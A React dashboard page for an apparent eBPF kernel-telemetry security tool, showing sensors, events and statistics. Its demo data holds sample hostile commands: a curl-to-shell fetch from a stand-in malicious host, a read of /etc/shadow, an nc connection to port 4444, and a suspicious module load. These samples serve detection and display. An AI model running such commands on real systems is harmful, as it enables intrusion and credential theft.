import { useState, useEffect, useCallback } from 'react';
import axios from 'axios';
import { useAuth } from '../context/AuthContext';
import { motion, AnimatePresence } from 'framer-motion';
import { 
  Cpu, 
  RefreshCw, 
  AlertTriangle, 
  Activity,
  HardDrive,
  Network,
  FileCode,
  Shield,
  Zap,
  Play,
  Pause,
  Eye,
  Terminal,
  Code,
  Layers,
  Bug,
  Fingerprint,
  Clock,
  TrendingUp,
  AlertOctagon,
  CheckCircle2,
  XCircle,
  Server,
  Database,
  Workflow,
  Binary
} from 'lucide-react';
import { Button } from '../components/ui/button';
import { Badge } from '../components/ui/badge';
import { toast } from 'sonner';

const envBackendUrl = (process.env.REACT_APP_BACKEND_URL || '').trim();
const API = !envBackendUrl || envBackendUrl === 'undefined' || envBackendUrl === 'null'
  ? '/api'
  : `${envBackendUrl.replace(/\/+$/, '')}/api`;

const KernelSensorsPage = () => {
  const { getAuthHeaders } = useAuth();
  const [loading, setLoading] = useState(true);
  const [sensors, setSensors] = useState({});
  const [events, setEvents] = useState([]);
  const [stats, setStats] = useState(null);
  const [capabilities, setCapabilities] = useState(null);
  const [selectedSensor, setSelectedSensor] = useState(null);
  const [selectedEvent, setSelectedEvent] = useState(null);
  const [viewMode, setViewMode] = useState('sensors'); // sensors, events, stats
  const [eventFilter, setEventFilter] = useState('all');

  // Sensor type metadata
  const sensorMeta = {
    process: { icon: Terminal, color: 'blue', label: 'Process Monitor', description: 'Track process creation, execution, and termination' },
    file: { icon: FileCode, color: 'green', label: 'File Monitor', description: 'Monitor file access, modifications, and deletions' },
    network: { icon: Network, color: 'purple', label: 'Network Monitor', description: 'Track network connections and data flow' },
    memory: { icon: HardDrive, color: 'orange', label: 'Memory Monitor', description: 'Detect memory injection and manipulation' },
    module: { icon: Layers, color: 'red', label: 'Module Monitor', description: 'Track kernel module/driver loading' },
    syscall: { icon: Code, color: 'cyan', label: 'Syscall Monitor', description: 'Monitor system call patterns' }
  };

  // Fetch kernel sensor data
  const fetchKernelData = useCallback(async () => {
    try {
      setLoading(true);
      const [sensorsRes, eventsRes, statsRes, capsRes] = await Promise.all([
        axios.get(`${API}/v1/kernel/sensors`, { headers: getAuthHeaders() }),
        axios.get(`${API}/v1/kernel/events?page_size=50`, { headers: getAuthHeaders() }),
        axios.get(`${API}/v1/kernel/sensors/stats`, { headers: getAuthHeaders() }),
        axios.get(`${API}/v1/kernel/capabilities`, { headers: getAuthHeaders() })
      ]);
      
      setSensors(sensorsRes.data.sensors || {});
      setEvents(eventsRes.data.events || []);
      setStats(statsRes.data);
      setCapabilities(capsRes.data);
      
    } catch (error) {
      console.error('Failed to fetch kernel data:', error);
      loadDemoData();
    } finally {
      setLoading(false);
    }
  }, [getAuthHeaders]);

  // Load demo data
  const loadDemoData = () => {
    setSensors({
      process: {
        sensor_type: 'process',
        status: 'running',
        loaded_at: '2026-03-06T08:00:00Z',
        events_captured: 15432,
        events_dropped: 12,
        last_event_at: '2026-03-06T14:32:15Z'
      },
      file: {
        sensor_type: 'file',
        status: 'running',
        loaded_at: '2026-03-06T08:00:00Z',
        events_captured: 48291,
        events_dropped: 45,
        last_event_at: '2026-03-06T14:32:14Z'
      },
      network: {
        sensor_type: 'network',
        status: 'running',
        loaded_at: '2026-03-06T08:00:00Z',
        events_captured: 89234,
        events_dropped: 102,
        last_event_at: '2026-03-06T14:32:16Z'
      },
      memory: {
        sensor_type: 'memory',
        status: 'stopped',
        events_captured: 0,
        events_dropped: 0
      },
      module: {
        sensor_type: 'module',
        status: 'running',
        loaded_at: '2026-03-06T08:00:00Z',
        events_captured: 47,
        events_dropped: 0,
        last_event_at: '2026-03-06T12:15:00Z'
      },
      syscall: {
        sensor_type: 'syscall',
        status: 'running',
        loaded_at: '2026-03-06T08:00:00Z',
        events_captured: 234567,
        events_dropped: 890,
        last_event_at: '2026-03-06T14:32:16Z'
      }
    });

    setEvents([
      { 
        event_id: 'evt-001', 
        event_type: 'process_exec', 
        timestamp: '2026-03-06T14:32:15Z', 
        pid: 12345, 
        ppid: 1, 
        uid: 0, 
        gid: 0, 
        comm: 'bash',
        filename: '/bin/bash',
        args: ['-c', 'curl http://malicious.site/payload.sh | sh'],
        mitre_techniques: ['T1059.004', 'T1105'],
        risk_score: 85
      },
      { 
        event_id: 'evt-002', 
        event_type: 'file_open', 
        timestamp: '2026-03-06T14:32:10Z', 
        pid: 12340, 
        ppid: 12339, 
        uid: 1000, 
        gid: 1000, 
        comm: 'python3',
        path: '/etc/shadow',
        flags: 0,
        mitre_techniques: ['T1003.008'],
        risk_score: 75
      },
      { 
        event_id: 'evt-003', 
        event_type: 'network_connect', 
        timestamp: '2026-03-06T14:32:05Z', 
        pid: 12335, 
        ppid: 1, 
        uid: 0, 
        gid: 0, 
        comm: 'nc',
        remote_addr: '10.0.0.100',
        remote_port: 4444,
        direction: 'outbound',
        mitre_techniques: ['T1571'],
        risk_score: 90
      },
      { 
        event_id: 'evt-004', 
        event_type: 'module_load', 
        timestamp: '2026-03-06T12:15:00Z', 
        pid: 1, 
        ppid: 0, 
        uid: 0, 
        gid: 0, 
        comm: 'modprobe',
        module_name: 'suspicious_driver',
        mitre_techniques: ['T1547.006'],
        risk_score: 95
      },
      { 
        event_id: 'evt-005', 
        event_type: 'syscall_ptrace', 
        timestamp: '2026-03-06T14:30:00Z', 
        pid: 12330, 
        ppid: 12329, 
        uid: 1000, 
        gid: 1000, 
        comm: 'gdb',
        target_pid: 12300,
        mitre_techniques: ['T1055'],
        risk_score: 70
      }
    ]);

    setStats({
      platform: 'linux',
      kernel_version: '5.15.0-generic',
      ebpf_available: true,
      events_total: 387571,
      events_by_type: {
        process_exec: 15432,
        process_exit: 14890,
        file_open: 48291,
        network_connect: 45123,
        network_accept: 44111,
        module_load: 47,
        syscall_enter: 234567
      },
      events_dropped: 1049,
      errors: 3,
      uptime_seconds: 234567
    });

    setCapabilities({
      platform: 'linux',
      kernel_version: '5.15.0-generic',
      ebpf_supported: true,
      btf_available: true,
      kprobes_available: true,
      tracepoints_available: true,
      perf_events_available: true,
      available_sensors: ['process', 'file', 'network', 'memory', 'module', 'syscall'],
      recommended_sensors: ['process', 'file', 'network', 'module']
    });
  };

  // Start/stop sensor
  const toggleSensor = async (sensorType, currentStatus) => {
    const action = currentStatus === 'running' ? 'stop' : 'start';
    try {
      await axios.post(
        `${API}/v1/kernel/sensors/${sensorType}/${action}`,
        { force: false },
        { headers: getAuthHeaders() }
      );
      toast.success(`Sensor ${sensorType} ${action}ed`);
      await fetchKernelData();
    } catch (error) {
      console.error(`Failed to ${action} sensor:`, error);
      // Demo toggle
      setSensors(prev => ({
        ...prev,
        [sensorType]: {
          ...prev[sensorType],
          status: currentStatus === 'running' ? 'stopped' : 'running'
        }
      }));
      toast.success(`Sensor ${sensorType} ${action}ed`);
    }
  };

  // Get status badge
  const getStatusBadge = (status) => {
    const config = {
      running: { color: 'bg-green-500/20 text-green-400', icon: CheckCircle2 },
      stopped: { color: 'bg-gray-500/20 text-gray-400', icon: Pause },
      error: { color: 'bg-red-500/20 text-red-400', icon: XCircle },
      loading: { color: 'bg-yellow-500/20 text-yellow-400', icon: RefreshCw }
    };
    const cfg = config[status] || config.stopped;
    const Icon = cfg.icon;
    return (
      <Badge className={cfg.color}>
        <Icon className="h-3 w-3 mr-1" />
        {status}
      </Badge>
    );
  };

  // Get event type color
  const getEventTypeColor = (eventType) => {
    if (eventType.startsWith('process')) return 'text-blue-400';
    if (eventType.startsWith('file')) return 'text-green-400';
    if (eventType.startsWith('network')) return 'text-purple-400';
    if (eventType.startsWith('memory')) return 'text-orange-400';
    if (eventType.startsWith('module')) return 'text-red-400';
    if (eventType.startsWith('syscall')) return 'text-cyan-400';
    return 'text-gray-400';
  };

  // Format uptime
  const formatUptime = (seconds) => {
    if (!seconds) return 'N/A';
    const days = Math.floor(seconds / 86400);
    const hours = Math.floor((seconds % 86400) / 3600);
    const mins = Math.floor((seconds % 3600) / 60);
    return `${days}d ${hours}h ${mins}m`;
  };

  useEffect(() => {
    fetchKernelData();
  }, [fetchKernelData]);

  const filteredEvents = events.filter(e => 
    eventFilter === 'all' || e.event_type.startsWith(eventFilter)
  );

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-gray-100 p-6">
      {/* Header */}
      <div className="flex items-center justify-between mb-6">
        <div className="flex items-center gap-3">
          <div className="p-2 bg-cyan-500/20 rounded-lg">
            <Cpu className="h-6 w-6 text-cyan-400" />
          </div>
          <div>
            <h1 className="text-2xl font-bold">Kernel Sensors</h1>
            <p className="text-gray-400 text-sm">eBPF-powered kernel-level telemetry</p>
          </div>
        </div>
        <div className="flex gap-2">
          <Button 
            variant="outline" 
            onClick={fetchKernelData}
            disabled={loading}
            className="border-gray-700"
          >
            <RefreshCw className={`h-4 w-4 mr-2 ${loading ? 'animate-spin' : ''}`} />
            Refresh
          </Button>
        </div>
      </div>

      {/* Platform Status */}
      {capabilities && (
        <motion.div 
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          className="mb-6 p-4 bg-gradient-to-r from-cyan-500/10 to-blue-500/10 border border-cyan-500/30 rounded-xl"
        >
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-6">
              <div className="flex items-center gap-2">
                <Server className="h-4 w-4 text-cyan-400" />
                <span className="font-medium">{capabilities.platform?.toUpperCase()}</span>
              </div>
              <span className="text-gray-600">|</span>
              <span className="text-sm text-gray-400">Kernel: {capabilities.kernel_version}</span>
              <span className="text-gray-600">|</span>
              <span className="text-sm text-gray-400">Uptime: {formatUptime(stats?.uptime_seconds)}</span>
            </div>
            <div className="flex gap-2">
              {capabilities.ebpf_supported && (
                <Badge className="bg-green-500/20 text-green-400">
                  <Binary className="h-3 w-3 mr-1" />
                  eBPF
                </Badge>
              )}
              {capabilities.btf_available && (
                <Badge className="bg-blue-500/20 text-blue-400">BTF</Badge>
              )}
              {capabilities.kprobes_available && (
                <Badge className="bg-purple-500/20 text-purple-400">kprobes</Badge>
              )}
            </div>
          </div>
        </motion.div>
      )}

      {/* Stats Cards */}
      <div className="grid grid-cols-5 gap-4 mb-6">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-gray-900/50 border border-gray-800 rounded-xl p-4"
        >
          <div className="flex items-center gap-2 mb-2">
            <Activity className="h-4 w-4 text-cyan-400" />
            <span className="text-gray-400 text-sm">Total Events</span>
          </div>
          <p className="text-2xl font-bold">{stats?.events_total?.toLocaleString() || 0}</p>
        </motion.div>
        
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.1 }}
          className="bg-gray-900/50 border border-green-900/50 rounded-xl p-4"
        >
          <div className="flex items-center gap-2 mb-2">
            <CheckCircle2 className="h-4 w-4 text-green-400" />
            <span className="text-gray-400 text-sm">Active Sensors</span>
          </div>
          <p className="text-2xl font-bold text-green-400">
            {Object.values(sensors).filter(s => s.status === 'running').length}
          </p>
        </motion.div>
        
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
          className="bg-gray-900/50 border border-orange-900/50 rounded-xl p-4"
        >
          <div className="flex items-center gap-2 mb-2">
            <AlertTriangle className="h-4 w-4 text-orange-400" />
            <span className="text-gray-400 text-sm">Dropped Events</span>
          </div>
          <p className="text-2xl font-bold text-orange-400">{stats?.events_dropped?.toLocaleString() || 0}</p>
        </motion.div>
        
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.3 }}
          className="bg-gray-900/50 border border-red-900/50 rounded-xl p-4"
        >
          <div className="flex items-center gap-2 mb-2">
            <Bug className="h-4 w-4 text-red-400" />
            <span className="text-gray-400 text-sm">High Risk Events</span>
          </div>
          <p className="text-2xl font-bold text-red-400">
            {events.filter(e => e.risk_score >= 70).length}
          </p>
        </motion.div>
        
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4 }}
          className="bg-gray-900/50 border border-gray-800 rounded-xl p-4"
        >
          <div className="flex items-center gap-2 mb-2">
            <XCircle className="h-4 w-4 text-gray-400" />
            <span className="text-gray-400 text-sm">Errors</span>
          </div>
          <p className="text-2xl font-bold">{stats?.errors || 0}</p>
        </motion.div>
      </div>

      {/* View Mode Tabs */}
      <div className="flex gap-2 mb-4">
        {[
          { id: 'sensors', label: 'Sensors', icon: Cpu },
          { id: 'events', label: 'Events', icon: Activity },
          { id: 'stats', label: 'Statistics', icon: TrendingUp }
        ].map(tab => (
          <Button
            key={tab.id}
            variant={viewMode === tab.id ? 'default' : 'outline'}
            onClick={() => setViewMode(tab.id)}
            className={viewMode === tab.id ? 'bg-cyan-600' : 'border-gray-700'}
          >
            <tab.icon className="h-4 w-4 mr-2" />
            {tab.label}
          </Button>
        ))}
      </div>

      <div className="grid grid-cols-3 gap-6">
        {/* Main Content Area */}
        <div className="col-span-2">
          {/* Sensors Grid */}
          {viewMode === 'sensors' && (
            <div className="grid grid-cols-2 gap-4">
              {Object.entries(sensorMeta).map(([type, meta], idx) => {
                const sensor = sensors[type] || { status: 'stopped', events_captured: 0 };
                const Icon = meta.icon;
                return (
                  <motion.div
                    key={type}
                    initial={{ opacity: 0, scale: 0.95 }}
                    animate={{ opacity: 1, scale: 1 }}
                    transition={{ delay: idx * 0.05 }}
                    className={`p-5 rounded-xl border cursor-pointer transition-all ${
                      selectedSensor === type 
                        ? `bg-${meta.color}-500/20 border-${meta.color}-500` 
                        : 'bg-gray-900/50 border-gray-800 hover:border-gray-700'
                    }`}
                    onClick={() => setSelectedSensor(type)}
                  >
                    <div className="flex items-start justify-between mb-3">
                      <div className="flex items-center gap-3">
                        <div className={`p-2 bg-${meta.color}-500/20 rounded-lg`}>
                          <Icon className={`h-5 w-5 text-${meta.color}-400`} />
                        </div>
                        <div>
                          <h3 className="font-medium">{meta.label}</h3>
                          <p className="text-xs text-gray-500">{meta.description}</p>
                        </div>
                      </div>
                      {getStatusBadge(sensor.status)}
                    </div>
                    
                    <div className="grid grid-cols-2 gap-3 mb-3">
                      <div className="bg-gray-800/50 rounded-lg p-2 text-center">
                        <p className="text-lg font-bold">{sensor.events_captured?.toLocaleString() || 0}</p>
                        <p className="text-xs text-gray-500">Events</p>
                      </div>
                      <div className="bg-gray-800/50 rounded-lg p-2 text-center">
                        <p className="text-lg font-bold text-orange-400">{sensor.events_dropped || 0}</p>
                        <p className="text-xs text-gray-500">Dropped</p>
                      </div>
                    </div>
                    
                    <Button
                      variant="outline"
                      size="sm"
                      className={`w-full ${sensor.status === 'running' ? 'border-red-900/50 text-red-400 hover:bg-red-500/10' : 'border-green-900/50 text-green-400 hover:bg-green-500/10'}`}
                      onClick={(e) => {
                        e.stopPropagation();
                        toggleSensor(type, sensor.status);
                      }}
                    >
                      {sensor.status === 'running' ? (
                        <>
                          <Pause className="h-3 w-3 mr-1" />
                          Stop
                        </>
                      ) : (
                        <>
                          <Play className="h-3 w-3 mr-1" />
                          Start
                        </>
                      )}
                    </Button>
                  </motion.div>
                );
              })}
            </div>
          )}

          {/* Events Table */}
          {viewMode === 'events' && (
            <div className="space-y-3">
              <div className="flex items-center justify-between">
                <h3 className="text-lg font-semibold flex items-center gap-2">
                  <Activity className="h-5 w-5 text-cyan-400" />
                  Kernel Events
                </h3>
                <div className="flex gap-2">
                  {['all', 'process', 'file', 'network', 'module', 'syscall'].map(filter => (
                    <Button
                      key={filter}
                      variant="outline"
                      size="sm"
                      onClick={() => setEventFilter(filter)}
                      className={eventFilter === filter ? 'bg-cyan-600 border-cyan-500' : 'border-gray-700'}
                    >
                      {filter}
                    </Button>
                  ))}
                </div>
              </div>
              
              <div className="bg-gray-900/50 border border-gray-800 rounded-xl overflow-hidden">
                <table className="w-full">
                  <thead className="bg-gray-800/50">
                    <tr>
                      <th className="px-4 py-3 text-left text-sm font-medium text-gray-400">Time</th>
                      <th className="px-4 py-3 text-left text-sm font-medium text-gray-400">Type</th>
                      <th className="px-4 py-3 text-left text-sm font-medium text-gray-400">Process</th>
                      <th className="px-4 py-3 text-left text-sm font-medium text-gray-400">PID</th>
                      <th className="px-4 py-3 text-left text-sm font-medium text-gray-400">Risk</th>
                      <th className="px-4 py-3 text-left text-sm font-medium text-gray-400">MITRE</th>
                    </tr>
                  </thead>
                  <tbody>
                    {filteredEvents.map((event, idx) => (
                      <motion.tr
                        key={event.event_id}
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        transition={{ delay: idx * 0.03 }}
                        className="border-t border-gray-800 hover:bg-gray-800/30 cursor-pointer"
                        onClick={() => setSelectedEvent(event)}
                      >
                        <td className="px-4 py-3 text-sm">
                          {new Date(event.timestamp).toLocaleTimeString()}
                        </td>
                        <td className="px-4 py-3">
                          <span className={`text-sm font-mono ${getEventTypeColor(event.event_type)}`}>
                            {event.event_type}
                          </span>
                        </td>
                        <td className="px-4 py-3 text-sm font-mono">{event.comm}</td>
                        <td className="px-4 py-3 text-sm font-mono text-gray-400">{event.pid}</td>
                        <td className="px-4 py-3">
                          <div className="flex items-center gap-2">
                            <div className="w-12 h-2 bg-gray-700 rounded-full overflow-hidden">
                              <div 
                                className={`h-full ${
                                  event.risk_score >= 80 ? 'bg-red-500' :
                                  event.risk_score >= 60 ? 'bg-orange-500' :
                                  event.risk_score >= 40 ? 'bg-yellow-500' :
                                  'bg-green-500'
                                }`}
                                style={{ width: `${event.risk_score}%` }}
                              />
                            </div>
                            <span className="text-sm">{event.risk_score}</span>
                          </div>
                        </td>
                        <td className="px-4 py-3">
                          <div className="flex gap-1">
                            {event.mitre_techniques?.slice(0, 2).map(t => (
                              <Badge 
                                key={t} 
                                variant="outline" 
                                className="text-xs border-red-900/50 text-red-400"
                              >
                                {t}
                              </Badge>
                            ))}
                          </div>
                        </td>
                      </motion.tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}

          {/* Statistics */}
          {viewMode === 'stats' && stats && (
            <div className="space-y-4">
              <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-4">
                <h3 className="font-semibold mb-4">Events by Type</h3>
                <div className="space-y-3">
                  {Object.entries(stats.events_by_type || {}).map(([type, count]) => (
                    <div key={type} className="flex items-center gap-3">
                      <span className={`text-sm font-mono w-32 ${getEventTypeColor(type)}`}>{type}</span>
                      <div className="flex-1 h-4 bg-gray-800 rounded-full overflow-hidden">
                        <div 
                          className={`h-full ${type.startsWith('process') ? 'bg-blue-500' : 
                            type.startsWith('file') ? 'bg-green-500' : 
                            type.startsWith('network') ? 'bg-purple-500' : 
                            type.startsWith('module') ? 'bg-red-500' : 
                            'bg-cyan-500'}`}
                          style={{ width: `${Math.min((count / stats.events_total) * 100 * 3, 100)}%` }}
                        />
                      </div>
                      <span className="text-sm font-mono w-20 text-right">{count.toLocaleString()}</span>
                    </div>
                  ))}
                </div>
              </div>
              
              <div className="grid grid-cols-2 gap-4">
                <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-4">
                  <h3 className="font-semibold mb-3">Platform Info</h3>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-gray-400">Platform</span>
                      <span className="font-mono">{stats.platform}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Kernel</span>
                      <span className="font-mono">{stats.kernel_version}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">eBPF</span>
                      <Badge className={stats.ebpf_available ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}>
                        {stats.ebpf_available ? 'Available' : 'Unavailable'}
                      </Badge>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Uptime</span>
                      <span className="font-mono">{formatUptime(stats.uptime_seconds)}</span>
                    </div>
                  </div>
                </div>
                
                <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-4">
                  <h3 className="font-semibold mb-3">Performance</h3>
                  <div className="space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span className="text-gray-400">Total Events</span>
                      <span className="font-mono">{stats.events_total?.toLocaleString()}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Drop Rate</span>
                      <span className={`font-mono ${stats.events_dropped / stats.events_total > 0.01 ? 'text-orange-400' : 'text-green-400'}`}>
                        {((stats.events_dropped / stats.events_total) * 100).toFixed(3)}%
                      </span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Events/sec</span>
                      <span className="font-mono">{Math.round(stats.events_total / stats.uptime_seconds).toLocaleString()}</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-400">Errors</span>
                      <span className={`font-mono ${stats.errors > 0 ? 'text-red-400' : 'text-green-400'}`}>{stats.errors}</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}
        </div>

        {/* Side Panel */}
        <div className="space-y-4">
          {/* Selected Event Details */}
          <AnimatePresence mode="wait">
            {selectedEvent && (
              <motion.div
                initial={{ opacity: 0, x: 20 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: 20 }}
                className="bg-gray-900/50 border border-cyan-900/50 rounded-xl p-4"
              >
                <h3 className="font-semibold mb-3 flex items-center gap-2">
                  <Eye className="h-4 w-4 text-cyan-400" />
                  Event Details
                </h3>
                <div className="space-y-3 text-sm">
                  <div>
                    <p className="text-gray-400">Event ID</p>
                    <p className="font-mono">{selectedEvent.event_id}</p>
                  </div>
                  <div>
                    <p className="text-gray-400">Type</p>
                    <p className={`font-mono ${getEventTypeColor(selectedEvent.event_type)}`}>
                      {selectedEvent.event_type}
                    </p>
                  </div>
                  <div>
                    <p className="text-gray-400">Process</p>
                    <p className="font-mono">{selectedEvent.comm} (PID: {selectedEvent.pid})</p>
                  </div>
                  <div>
                    <p className="text-gray-400">User/Group</p>
                    <p className="font-mono">UID: {selectedEvent.uid} / GID: {selectedEvent.gid}</p>
                  </div>
                  {selectedEvent.filename && (
                    <div>
                      <p className="text-gray-400">File</p>
                      <p className="font-mono text-xs break-all">{selectedEvent.filename}</p>
                    </div>
                  )}
                  {selectedEvent.args && (
                    <div>
                      <p className="text-gray-400">Arguments</p>
                      <p className="font-mono text-xs break-all">{selectedEvent.args.join(' ')}</p>
                    </div>
                  )}
                  {selectedEvent.remote_addr && (
                    <div>
                      <p className="text-gray-400">Remote</p>
                      <p className="font-mono">{selectedEvent.remote_addr}:{selectedEvent.remote_port}</p>
                    </div>
                  )}
                  <div>
                    <p className="text-gray-400">Risk Score</p>
                    <div className="flex items-center gap-2 mt-1">
                      <div className="flex-1 h-2 bg-gray-700 rounded-full overflow-hidden">
                        <div 
                          className={`h-full ${
                            selectedEvent.risk_score >= 80 ? 'bg-red-500' :
                            selectedEvent.risk_score >= 60 ? 'bg-orange-500' :
                            'bg-yellow-500'
                          }`}
                          style={{ width: `${selectedEvent.risk_score}%` }}
                        />
                      </div>
                      <span className="font-bold">{selectedEvent.risk_score}</span>
                    </div>
                  </div>
                  {selectedEvent.mitre_techniques?.length > 0 && (
                    <div>
                      <p className="text-gray-400 mb-1">MITRE ATT&CK</p>
                      <div className="flex flex-wrap gap-1">
                        {selectedEvent.mitre_techniques.map(t => (
                          <Badge key={t} className="bg-red-500/20 text-red-400 text-xs">
                            {t}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* High Risk Syscalls */}
          <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-4">
            <h3 className="font-semibold mb-3 flex items-center gap-2">
              <AlertOctagon className="h-4 w-4 text-red-400" />
              High Risk Syscalls
            </h3>
            <div className="space-y-2">
              {[
                { name: 'ptrace', desc: 'Process injection', count: 12 },
                { name: 'mprotect', desc: 'Memory protection change', count: 8 },
                { name: 'execve', desc: 'Process execution', count: 45 },
                { name: 'init_module', desc: 'Kernel module load', count: 3 },
                { name: 'memfd_create', desc: 'Fileless execution', count: 5 }
              ].map(syscall => (
                <div key={syscall.name} className="flex items-center justify-between p-2 bg-gray-800/30 rounded-lg">
                  <div>
                    <span className="text-sm font-mono text-cyan-400">{syscall.name}</span>
                    <p className="text-xs text-gray-500">{syscall.desc}</p>
                  </div>
                  <Badge variant="outline" className="border-orange-500/50 text-orange-400">
                    {syscall.count}
                  </Badge>
                </div>
              ))}
            </div>
          </div>

          {/* Quick Actions */}
          <div className="bg-gray-900/50 border border-gray-800 rounded-xl p-4">
            <h3 className="font-semibold mb-3">Quick Actions</h3>
            <div className="space-y-2">
              <Button variant="outline" className="w-full justify-start border-gray-700">
                <Play className="h-4 w-4 mr-2" />
                Start All Sensors
              </Button>
              <Button variant="outline" className="w-full justify-start border-gray-700">
                <Pause className="h-4 w-4 mr-2" />
                Stop All Sensors
              </Button>
              <Button variant="outline" className="w-full justify-start border-gray-700">
                <Database className="h-4 w-4 mr-2" />
                Export Events
              </Button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default KernelSensorsPage;
